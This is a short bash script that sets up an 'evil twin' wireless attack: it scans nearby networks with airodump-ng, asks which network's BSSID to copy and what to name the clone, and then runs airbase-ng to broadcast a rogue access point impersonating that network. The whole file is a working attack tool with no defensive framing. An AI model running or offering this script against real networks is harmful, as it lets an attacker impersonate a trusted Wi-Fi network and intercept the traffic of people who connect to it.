#! /bin/bash

echo "Please enter your Wireless Interface: "

read int

sudo airodump-ng $int

echo "Please enter the BSSID of the network you wish to copy: "
read BSSID
echo "Name of the Twin: "
read NAME

sudo airbase-ng -a $BSSID -e $NAME -c 6 $int
